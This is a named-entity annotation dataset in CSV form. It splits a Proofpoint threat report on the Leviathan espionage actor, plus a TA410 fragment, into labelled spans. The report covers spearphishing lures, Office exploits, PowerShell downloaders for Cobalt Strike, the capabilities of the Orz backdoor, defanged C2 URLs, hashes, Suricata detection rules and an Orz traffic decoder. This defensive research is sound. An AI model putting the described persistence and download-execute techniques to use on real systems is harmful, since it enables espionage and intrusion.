TA410,Win32/LookBack,malware
TA410," CnC Activity

© 2020. All rights reserved. Terms and conditions Privacy Policy Sitemap

 

",O
TA410,"HKEY_LOCAL_MACHINE\HARDWARE\{A5124AF5-DF23-49bf-B0ED-
A18ED3DEA027}",ioc
TA410,"

Registry
Key

",O
TA410,G:\FlowCloud\trunk\Dev\src\fcClient\Release\QQSetupEx_func.pdb,ioc
TA410," File
Path

",O
TA410,g:\FlowCloud\trunk\Dev\src\fcClient\Release\fcClientDll.pdb,ioc
TA410," File
Path

",O
TA410,F:\FlowCloud\trunk\Dev\src\fcClient\kmspy\Driver\Release\Driver.pdb,ioc
TA410," File
Path

",O
TA410,F:\FlowCloud\trunk\Dev\src\fcClient\kmspy\Driver\x64\Release\Driver.pdb,ioc
TA410," File
Path

https://www.proofpoint.com/us/license
https://www.proofpoint.com/us/privacy-policy
https://www.proofpoint.com/us/sitemap.xml",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 1/12

",O
Leviathan_Espionage_actor,"October 17, 2017",timestamp
Leviathan_Espionage_actor,"

",O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets
proofpoint.com/us/threat‑insight/post/leviathan‑espionage‑actor‑spearphishes‑maritime‑and‑defense‑targets

Overview

Proofpoint researchers are tracking an espionage actor targeting organizations and high‑value targets in
defense and government. Active ",O
Leviathan_Espionage_actor,since at least 2014,timestamp
Leviathan_Espionage_actor,", this actor has long‑standing interest in maritime industries,
naval defense contractors, and associated research institutions in the ",O
Leviathan_Espionage_actor,United States,country
Leviathan_Espionage_actor, and ,O
Leviathan_Espionage_actor,Western Europe,country
Leviathan_Espionage_actor,".

Key takeaways from this research include:

Industry targeting: The actor targets defense contractors, universities (particularly those with military
research ties), legal organizations [3] and government agencies [3]. The actor has particular interest in
naval industries including ",O
Leviathan_Espionage_actor,shipbuilding,industry
Leviathan_Espionage_actor," and related research
Geographical targeting: Targeting includes ",O
Leviathan_Espionage_actor,United States,country
Leviathan_Espionage_actor,", ",O
Leviathan_Espionage_actor,Western Europe,country
Leviathan_Espionage_actor,", and ",O
Leviathan_Espionage_actor,South China Sea,country
Leviathan_Espionage_actor,"
Tools: Custom JavaScript malware known as “",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor,” and “,O
Leviathan_Espionage_actor,NanHaiShu,malware
Leviathan_Espionage_actor,"”, ",O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor,", the SeDll JavaScript
loader, and MockDll dll loader
Delivery: Emailed attachments and URLs, often employing a fraudulent lookalike domain and stolen
branding
Exploitation: ",O
Leviathan_Espionage_actor,Microsoft Excel,software
Leviathan_Espionage_actor," and Word documents with macros (sometimes password‑protected), very
recent vulnerabilities such as ",O
Leviathan_Espionage_actor,CVE‑2017‑0199,O
Leviathan_Espionage_actor, and ,O
Leviathan_Espionage_actor,CVE‑2017‑8759,O
Leviathan_Espionage_actor,", and malicious ",O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor,"
files
Installation: ",O
Leviathan_Espionage_actor,JavaScript,software
Leviathan_Espionage_actor,", JavaScript Scriptlets in XML, HTA, ",O
Leviathan_Espionage_actor,PowerShell,software
Leviathan_Espionage_actor,", ",O
Leviathan_Espionage_actor,WMI,tool
Leviathan_Espionage_actor,", ",O
Leviathan_Espionage_actor,regsvr32,tool
Leviathan_Espionage_actor,", ",O
Leviathan_Espionage_actor,Squiblydoo,mitre_attack
Leviathan_Espionage_actor,"
Lateral Movement: The actor sometimes utilizes access at one compromised organization to attack the
next. For example, compromised email accounts at one organization were used to send the next wave of
malicious attachments to potential victims in the same industry. Similarly the actor attempts to
compromise servers within victim organizations and use them for command and control (C&C) for their
malware.

This blog traces key activities connected to this actor and examines a number of their tools and techniques.
Campaigns and details are presented in reverse chronological order to highlight the group’s most recent
activities.

Delivery and Exploitation

",O
Leviathan_Espionage_actor,September 2017,timestamp
Leviathan_Espionage_actor,"

On ",O
Leviathan_Espionage_actor,"September 15 and 19, 2017",timestamp
Leviathan_Espionage_actor,", Proofpoint detected and blocked spearphishing emails from this group targeting
a US shipbuilding company and a US university research center with military ties. Example emails used the
subject “Apply for internship position” and contained an attachment “",O
Leviathan_Espionage_actor,resume.rtf,ioc
Leviathan_Espionage_actor,"”. Another attachment,
“",O
Leviathan_Espionage_actor,ARLUAS_FieldLog_2017‑08‑21.doc,ioc
Leviathan_Espionage_actor,"” contained a “Torpedo recovery experiment” lure. The attachments
exploited ",O
Leviathan_Espionage_actor,CVE‑2017‑8759,O
Leviathan_Espionage_actor," which was discovered and documented only five days prior to the campaign [1].

https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets
https://www.proofpoint.com/us/threat-reference/malware
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0199
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759
https://www.proofpoint.com/us/threat-reference/spear-phishing


",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 2/12

Figure 1: Example attachment ",O
Leviathan_Espionage_actor,resume.rtf,ioc
Leviathan_Espionage_actor, from ,O
Leviathan_Espionage_actor,September 2017,timestamp
Leviathan_Espionage_actor," campaign

",O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,"

",O
Leviathan_Espionage_actor,Between August 2 and 4,timestamp
Leviathan_Espionage_actor,", the actor sent targeted spearphishing emails containing malicious URLs linking to
documents to multiple defense contractors. Some of this activity was documented and observed by a fellow
researcher [2]. Many of the documents, C&C domains, and payload domains abused the brand of a major
provider of ships, submarines, and other vessels with military applications. Some of the documents exploited
",O
Leviathan_Espionage_actor,CVE‑2017‑0199,O
Leviathan_Espionage_actor," to deliver the payload.

Figure 2: One of the documents involved in the campaign used ",O
Leviathan_Espionage_actor,Microsoft,org
Leviathan_Espionage_actor," licensing lures purporting to be
from a well‑known shipbuilder (sha256:
",O
Leviathan_Espionage_actor,6f6ee01e9dc2d8c4c260ef4131fe88dc152e53ee8afd3e66e92d4e1bf5fd2e92,ioc
Leviathan_Espionage_actor,").

Other documents were ",O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor," files that relied on social engineering. The potential victims were
lured into starting an embedded PowerPoint presentation, moving the mouse to trigger execution of an
embedded JavaScript [5], and then pressing “Enable” in a warning dialog to cause the payload download. The
Publisher files were poorly crafted, relied on multiple user interactions, and contained multiple grammatical and
typographic errors.



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 3/12

Figure 3: Publisher document delivered via a link in email is in Italian, and is a simple reuse of a
student’swork.

",O
Leviathan_Espionage_actor,February 2015,timestamp
Leviathan_Espionage_actor,"

",O
Leviathan_Espionage_actor,From February to October of 2015,timestamp
Leviathan_Espionage_actor,", our colleagues at ",O
Leviathan_Espionage_actor,F‑Secure,org
Leviathan_Espionage_actor, and ,O
Leviathan_Espionage_actor,McAfee,org
Leviathan_Espionage_actor," reported on campaigns [3][4] by this
actor targeting ",O
Leviathan_Espionage_actor,South China Sea,country
Leviathan_Espionage_actor," interests. During this time, the group utilized ",O
Leviathan_Espionage_actor,Microsoft Excel,software
Leviathan_Espionage_actor, and ,software
Leviathan_Espionage_actor,Word,software
Leviathan_Espionage_actor,"
documents with macros to target the ",O
Leviathan_Espionage_actor,Philippines Department of Justice,org
Leviathan_Espionage_actor,", ",org
Leviathan_Espionage_actor,APEC,org
Leviathan_Espionage_actor," organizers, and an international
law firm. Targeting of these companies is different from that which we typically observe for this actor; however it
still centers around marine and naval issues as related to ",O
Leviathan_Espionage_actor,South China sea,country
Leviathan_Espionage_actor," politics.

Figure 4: Example attachment “",O
Leviathan_Espionage_actor,"DOJ Staff bonus  January 13, 2015.xls",ioc
Leviathan_Espionage_actor,"”. Similar to this document attachment,
most of the attachments in this campaign did not contain meaningful content

",O
Leviathan_Espionage_actor,November 2014,timestamp
Leviathan_Espionage_actor,"

The period between ",O
Leviathan_Espionage_actor,November 2014,timestamp
Leviathan_Espionage_actor, and ,O
Leviathan_Espionage_actor,January 2015,timestamp
Leviathan_Espionage_actor," marked one of the earlier instances in which Proofpoint
observed persistent exploitation attempts by this actor. The actor generally emailed ",O
Leviathan_Espionage_actor,Microsoft Excel,software
Leviathan_Espionage_actor," documents
with malicious macros to ",O
Leviathan_Espionage_actor,US,country
Leviathan_Espionage_actor," universities with military interests, most frequently related to ",O
Leviathan_Espionage_actor,THE Navy,org
Leviathan_Espionage_actor,". The actor
also occasionally used macro‑laden ",O
Leviathan_Espionage_actor,Microsoft Word,software
Leviathan_Espionage_actor, documents to target other ,software
Leviathan_Espionage_actor,US,country
Leviathan_Espionage_actor," research and development
organizations with military and intelligence ties during this period.

Emails were often very simple with a greeting and an attachment. On other occasions, it appears that the
attackers used highly topical lures based on current events or legitimate documents stolen from previous
victims. Lure topics included symposia, ",O
Leviathan_Espionage_actor,the Navy,org
Leviathan_Espionage_actor,", ",O
Leviathan_Espionage_actor,IT,industry
Leviathan_Espionage_actor,", and relevant research.



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 4/12

Figure 5: Example Excel attachment “",O
Leviathan_Espionage_actor,2014 Accomplishments Input Template.xls,ioc
Leviathan_Espionage_actor,"”

Installation

The actor continues to:

Innovate and modify the code that accomplishes the installation, while the backdoor code remains more
static
Use scripting languages such as JavaScript, JavaScript Scriptlets, VBScript, and XML
Use simple obfuscation such as base64, gzip compression, and insertion of garbage characters
Split functionality of the backdoor & code that establishes persistence for the backdoor into separate files
and scripts

Example 1: ",O
Leviathan_Espionage_actor,Resume.rtf,ioc
Leviathan_Espionage_actor,"

The “",O
Leviathan_Espionage_actor,resume.rtf,ioc
Leviathan_Espionage_actor,” file from the ,O
Leviathan_Espionage_actor,"September 19, 2017",timestamp
Leviathan_Espionage_actor," attack retrieves the malicious SOAP WSDL definition named
“",timestamp
Leviathan_Espionage_actor,readme.txt,ioc
Leviathan_Espionage_actor," “ using an anonymous FTP logon to the attacker’s server.

Figure 6: SOAP WSDL definition (“",O
Leviathan_Espionage_actor,readme.txt,ioc
Leviathan_Espionage_actor,"“)

This definition in turn downloads a VBScript ",O
Leviathan_Espionage_actor,favicon.ico,ioc
Leviathan_Espionage_actor," file, which then creates and runs two JavaScript files in
the %TMP% directory:

Figure 7: Code snipped showing VBScript dropping 2 JavaScript files



9/10/2018 ",O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 5/12

The job of the smaller of the two JavaScripts is to establish a system autostart mechanism. It accomplishes this
by deobfuscating another script, link.js, into %TMP%. Link.js in turn creates a shortcut  file """,O
Leviathan_Espionage_actor,"Java(TM) Platform
SE Auto Updater.lnk",ioc
Leviathan_Espionage_actor,""" in the ""Startup"" special folder pointing to the main backdoor JavaScript.

Figure 8: Code for establishing persistence after reboot (autostart mechanism)

The job of the larger of the two JavaScripts is to download and execute the ",O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor," payload. It
accomplishes this by writing more code to rWug5n0PHUFjDFyb8k.js in the temporary directory, which then runs
a PowerShell command (obfuscated using garbage characters, base64 encoding, and Gzip compression). The
PowerShell is a default ",O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor," downloader.

Figure 9: PowerShell code downloading ",O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor,"

Example 2: Malicious ",O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor," document

The malicious script executed by the ",O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor," file downloads and runs yet another JavaScript file,
0.js, hosted on the attacker‑controlled server:

Figure 10: Malicious script executed by the ",O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor," file (sha256:
",O
Leviathan_Espionage_actor,305f331bfb1e97028f8c92cbcb1dff2741dcddacc76843e65f9b1ec5a66f52bc,ioc
Leviathan_Espionage_actor,")



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 6/12

Similar to the previous example (resume.rtf), the 0.js handles the system autostart mechanism via a shortcut file
""",O
Leviathan_Espionage_actor,office 365.lnk,ioc
Leviathan_Espionage_actor,""" in the ""Startup"" special folder. However, the shortcut abuses the “",O
Leviathan_Espionage_actor,Squiblydoo,mitre_attack
Leviathan_Espionage_actor,"” technique [6].
Moreover, the backdoor is not run directly but via an intermediary SeDll (see below).

0.js also downloads two additional files from the C&C server (green.ddd and green.tmp) The first of these files,
green.ddd, is an executable file internally named “",O
Leviathan_Espionage_actor,SEDll_Win32.dll,ioc
Leviathan_Espionage_actor,"”. This is a known backdoor used by this actor
",O
Leviathan_Espionage_actor,since 2014,timestamp
Leviathan_Espionage_actor, for the same purpose: decrypting and executing the final JavaScript backdoor “,O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor,"”.

Tools

",O
Leviathan_Espionage_actor,NanHaiShu,malware
Leviathan_Espionage_actor,"

We have observed variants of this JavaScript backdoor used in various campaigns, including those publically
reported. The actor continues to improve and refine the malware by, for example, wrapping it inside an HTA
wrapper. Several good descriptions are available  in analyses from fellow researchers [3][4]. Basic functionality
includes:

Information gathering (computer name, user name, serial number, proxy server)
Downloading from URL
Executing other JavaScript
Registry, system, process, directory, file operations
SafeIE (change IE settings to reduce warnings about about malware activity)

Figure 11: Screenshot from ",O
Leviathan_Espionage_actor,2015,timestamp
Leviathan_Espionage_actor, version of the malware dropped by “,O
Leviathan_Espionage_actor,"DOJ Staff bonus January 13, 2015.xls",ioc
Leviathan_Espionage_actor,"”

",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor,"

We observed this backdoor in an ",O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor, campaign dropped by the ,O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor," files,
as well as much ",O
Leviathan_Espionage_actor,earlier in 2014,timestamp
Leviathan_Espionage_actor,. We named it due to a variable name “,O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor,"”, which is changed to “core” in the more recent
version. The actor consistently tweaks and improves this backdoor as well. The backdoor is a fairly involved
script malware. Its functionality includes:

Information gathering (IE version, OS version, OS 64‑bit/32‑bit, etc)
Overwriting registry settings to reduce malware visibility on system
Download file
Upload file
Execute a command with cscript
Execute JavaScript
Execute shell command
Execute a dll (via an embedded ‘MockDll')
Get proxy info
Get process list
Terminate process
Get drive info



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 7/12

GET request to a URL
POST request to a URL

Figure 12: Snippet of the ",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor, backdoor code delivered by the the ,O
Leviathan_Espionage_actor,Microsoft Publisher,software
Leviathan_Espionage_actor," document. The URL
domain is a fraudulent lookalike domain.

There is an extensive configuration section at the top of the script. The ""jmpUrlList"" provides the initial C&C
servers, which are used to determine the secondary C&C server as well as additional commands to execute. It is
worth noting that the secondary C&C may be the same as the first. We have observed attacker‑controlled web
servers, compromised victim web servers, and ",O
Leviathan_Espionage_actor,Technet,org
Leviathan_Espionage_actor, and ,org
Leviathan_Espionage_actor,Pastebin,org
Leviathan_Espionage_actor," web pages used for the initial C&C.

The initial C&C response is parsed with a regex. The backdoor first looks for the secondary encoded C&C server
using the ""jmpRegex"" regex. Next, the backdoor looks for additional code to execute using the ""codeRegex""
regex. For additional code, we observed simple code blocks that provide a different upload/download
functionality.

Figure 13: The encoded response """,O
Leviathan_Espionage_actor,vcmQx3ELgTyTyOVSvsm7wrBKwraFw8VFwCuL,ioc
Leviathan_Espionage_actor,""" in the image above
decodes to """,O
Leviathan_Espionage_actor,hxxp://www.vitaminmain[.]info,ioc
Leviathan_Espionage_actor,""" which is the secondary C&C server for an older backdoor variant
(Decoder provided in Appendix).

MockDll

Some versions of the ",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor," backdoor have 32‑ and 64‑bit embedded DLLs, stored internally as base64 strings.
Their purpose is to simply run another binary. These are used as loaders for future executable payloads, using
the well‑known process hollowing technique. To use the MockDll, the backdoor creates a configuration .ini file



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 8/12

like that shown in Figure 14:

Figure 14: MockDll configuration file

mock: defaults to '",O
Leviathan_Espionage_actor,regsvr32,tool
Leviathan_Espionage_actor,"'

real: the dll, which is the ultimate goal to execute

args: arguments to the dll that will be executed, if any

outf: file in which to write results of the MockDll run

time: timeout defaults to 5

After the configuration file is created, the MockDll is executed with ",O
Leviathan_Espionage_actor,regsvr32,tool
Leviathan_Espionage_actor,". MockDll reads the mentioned .ini
config file to determine what to execute. It can log its execution results into a file specified by the “outf”
parameter, as shown in Figure 15:

Figure 15: Contents of the log file created by MockDll

SeDll

This DLL is used for decrypting and executing another JavaScript backdoor such as ",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor,". The DLL is registered
by the installer using ",O
Leviathan_Espionage_actor,regsvr32,tool
Leviathan_Espionage_actor,". The DllRegisterServer export is then called, which performs checks on the
commandline parameter. If the string “DR” is passed as an argument, or if the DLL is running in the active
session with a username that is not “system”, the final JavaScript backdoor is decoded using a custom base64
alphabet. This backdoor has to be present in the same directory as the dll, with a “.tmp” file extension. The
backdoor script is then executed using the IActiveScript and IActiveScriptParse32 COM interfaces.

Figure 16: Decoding and executing of the JavaScript backdoor

If those conditions are not met, it runs the following command line “""regsvr32 /s \""%s\"" DR __CIM__""” to register
the DLL, where %s is the path to the DLL. It tries to do this with the current user privileges, but if the privileges
cannot be adjusted it defaults to the available execution environment.

",O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor,"

This is a penetration testing tool. The attackers often abuse the free trial version.

Conclusion



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 9/12

This actor, whose espionage activities primarily focus on targets in the US and Western Europe with military ties,
has been active ",O
Leviathan_Espionage_actor,since at least 2014,timestamp
Leviathan_Espionage_actor,". The tools, techniques, and targets consistently connect their work,
particular given their attention to naval and maritime defense interests and use of custom backdoors. While
defense contractors and academic research centers with military ties should always be cognizant of the
potential for cyberattacks, organizations fitting their targeting profiles should be especially wary of legitimate‑
looking but unsolicited emails from outside entities. Appropriate layered defenses at the firewall, email gateway,
and endpoint can all help prevent the kinds of lateral movement we have observed with this actor, as well as the
compromise and abuse of systems via which this group expands its attack surface to other organizations.

References

[1] https://www.fireeye.com/blog/threat‑research/2017/09/zero‑day‑used‑to‑distribute‑finspy.html

[2] https://twitter.com/James_inthe_box/status/893525493059788800

[3] https://labsblog.f‑secure.com/2016/08/04/nanhaishu‑rating‑the‑south‑china‑sea/

[4] https://community.spiceworks.com/topic/1028936‑stealthy‑cyberespionage‑campaign‑attacks‑with‑social‑
engineering

[5] http://blog.trendmicro.com/trendlabs‑security‑intelligence/mouseover‑otlard‑gootkit/

[6] https://www.carbonblack.com/2016/04/28/threat‑advisory‑squiblydoo‑continues‑trend‑of‑attackers‑using‑
native‑os‑tools‑to‑live‑off‑the‑land/

Indicators of Compromise (IOCs)

IOC IOC
Type

Description

",O
Leviathan_Espionage_actor,cdf6e2e928a89cbb857e688055a25e37a8d8b8b90530bd52c8548fb544f66f1f,ioc
Leviathan_Espionage_actor, SHA256 Resume.rtf exploiting ,O
Leviathan_Espionage_actor,CVE‑2017‑8759,O
Leviathan_Espionage_actor, (,O
Leviathan_Espionage_actor,"Sep 19, 2017",timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,c7fa6f27ec4f4142ae591f2dd7c63d046431945f03c87dbed88d79f55180a46d,ioc
Leviathan_Espionage_actor, SHA256 ,O
Leviathan_Espionage_actor,ARLUAS_FieldLog_2017‑08‑21.doc,ioc
Leviathan_Espionage_actor, exploiting ,O
Leviathan_Espionage_actor,CVE‑2017‑8759,O
Leviathan_Espionage_actor, (,O
Leviathan_Espionage_actor,"Sep 19, 2017",timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,ftp://185.106.120[.]206/pub/readme.txt,ioc
Leviathan_Espionage_actor, URL ,O
Leviathan_Espionage_actor,Resume.rtf,ioc
Leviathan_Espionage_actor," downloading
scripts (",O
Leviathan_Espionage_actor,"Sep 19, 2017",timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,hxxp://185.106.120[.]206/favicon.ico,ioc
Leviathan_Espionage_actor, URL ,O
Leviathan_Espionage_actor,Resume.rtf,ioc
Leviathan_Espionage_actor," downloading
scripts (",O
Leviathan_Espionage_actor,"Sep 19, 2017",timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,39c952c7e14b6be5a9cb1be3f05eafa22e1115806e927f4e2dc85d609bc0eb36,ioc
Leviathan_Espionage_actor, SHA256 ,O
Leviathan_Espionage_actor,Favicon.ico,ioc
Leviathan_Espionage_actor, (,O
Leviathan_Espionage_actor,"Sep 19, 2017",timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,5860ddc428ffa900258207e9c385f843a3472f2fbf252d2f6357d458646cf362,ioc
Leviathan_Espionage_actor, SHA256 ,O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor, (,O
Leviathan_Espionage_actor,"Sep 19, 2017",timestamp
Leviathan_Espionage_actor,")

",timestamp
Leviathan_Espionage_actor,ced7ca9625543d3d3d09f70223cc19f0d99e21792854452df5ba84b3a59d17b8,ioc
Leviathan_Espionage_actor, SHA256 ,O
Leviathan_Espionage_actor,20170720_final_pm_app‑2.doc,ioc
Leviathan_Espionage_actor, (,O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,)Document hash (,O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,305f331bfb1e97028f8c92cbcb1dff2741dcddacc76843e65f9b1ec5a66f52bc,ioc
Leviathan_Espionage_actor, SHA256 Publisher hash (,O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,bfc5c6817ff2cc4f3cd40f649e10cc9ae1e52139f35fdddbd32cb4d221368922,ioc
Leviathan_Espionage_actor, SHA256 MockDll 32‑bit (,O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,")

https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html
https://twitter.com/James_inthe_box/status/893525493059788800
https://labsblog.f-secure.com/2016/08/04/nanhaishu-rating-the-south-china-sea/
https://community.spiceworks.com/topic/1028936-stealthy-cyberespionage-campaign-attacks-with-social-engineering
http://blog.trendmicro.com/trendlabs-security-intelligence/mouseover-otlard-gootkit/
https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/


",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 10/12

",O
Leviathan_Espionage_actor,80b931ab1798d7d8a8d63411861cee07e31bb9a68f595f579e11d3817cfc4aca,ioc
Leviathan_Espionage_actor, SHA256 MockDll 32‑bit (,O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,146aa9a0ec013aa5bdba9ea9d29f59d48d43bc17c6a20b74bb8c521dbb5bc6f4,ioc
Leviathan_Espionage_actor, SHA256 ,O
Leviathan_Espionage_actor,green.ddd,ioc
Leviathan_Espionage_actor, SeDll (,O
Leviathan_Espionage_actor,August 2017,timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,4029b43c7febd05e8bf013c1022244aaa238341ca44bbce2250667614c1a4932,ioc
Leviathan_Espionage_actor, SHA256 ,O
Leviathan_Espionage_actor,2014 Accomplishments Input Template.xls,ioc
Leviathan_Espionage_actor, (,O
Leviathan_Espionage_actor,December 2014,timestamp
Leviathan_Espionage_actor,")

",O
Leviathan_Espionage_actor,hxxp://www.vitaminmain[.]info,ioc
Leviathan_Espionage_actor, URL ,O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor," secondary C2
(",O
Leviathan_Espionage_actor,December 2014,timestamp
Leviathan_Espionage_actor,")

ET and ETPRO Suricata/Snort Coverage

2024192 | ET EXPLOIT Possible ",O
Leviathan_Espionage_actor,CVE‑2017‑0199,O
Leviathan_Espionage_actor," HTA Inbound

2024196 | ET WEB_CLIENT HTA File containing Wscript.Shell Call ‑ Potential ",O
Leviathan_Espionage_actor,CVE‑2017‑0199,O
Leviathan_Espionage_actor,"

2022520 | ET POLICY Possible HTA Application Download

2024197 | ET CURRENT_EVENTS SUSPICIOUS MSXMLHTTP DL of HTA (Observed in ",O
Leviathan_Espionage_actor,CVE‑2017‑0199,O
Leviathan_Espionage_actor,")

2024449 | ET CURRENT_EVENTS SUSPICIOUS Possible ",O
Leviathan_Espionage_actor,CVE‑2017‑0199,O
Leviathan_Espionage_actor," IE7/NoCookie/Referer HTA dl

2814013 | ETPRO TROJAN ",O
Leviathan_Espionage_actor,Meterpreter,malware
Leviathan_Espionage_actor," or Other Reverse Shell SSL Cert

2023629 |  ET INFO Suspicious Empty SSL Certificate ‑ Observed in ",O
Leviathan_Espionage_actor,Cobalt Strike,malware
Leviathan_Espionage_actor,"

2810628 | ETPRO TROJAN JavaScript Backdoor CnC Beacon M2 (b64 3)

2828317 | ETPRO TROJAN ",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor," JavaScript Backdoor Communicating with CnC

2828316 | ETPRO TROJAN ",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor," JavaScript Backdoor Sending Password to CnC

Appendix: ",O
Leviathan_Espionage_actor,Orz,malware
Leviathan_Espionage_actor," Traffic Decoder

var _keyStr = ""oMZF/W42VkcCbqOiPSajhnKtQws8NRAxr16XJpu=0mgE3THGLlvz9+5BDYd7feyUI"";

function decode (input) {

                       var output = """";

                       var chr1, chr2, chr3;

                       var enc1, enc2, enc3, enc4;

                       var i = 0;

                       input = input.replace(/[^A‑Za‑z0‑9\+\/\=]/g, """");

                       while (i ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," input.length) {

                                   enc1 = this._keyStr.indexOf(input.charAt(i++));

                                   enc2 = this._keyStr.indexOf(input.charAt(i++));

                                   enc3 = this._keyStr.indexOf(input.charAt(i++));

                                   enc4 = this._keyStr.indexOf(input.charAt(i++));

                                   chr1 = (enc1 ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 2) | (enc2 >> 4);

                                   chr2 = ((enc2 & 15) ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 4) | (enc3 >> 2);

                                   chr3 = ((enc3 & 3) ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 6) | enc4;



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 11/12

                                   output = output + String.fromCharCode(chr1);

                                   if (enc3 != 64) {

                                               output = output + String.fromCharCode(chr2);

                                   }

                                   if (enc4 != 64) {

                                               output = output + String.fromCharCode(chr3);

                                   }

                       }

                       output = this._utf8_decode(output);

                       return output;

           }

function _utf8_decode (utftext) {

                       var string = """";

                       var i = 0;

                       var c = c1 = c2 = 0;

                       while ( i ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," utftext.length ) {

                                   c = utftext.charCodeAt(i);

                                   if (c ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 128) {

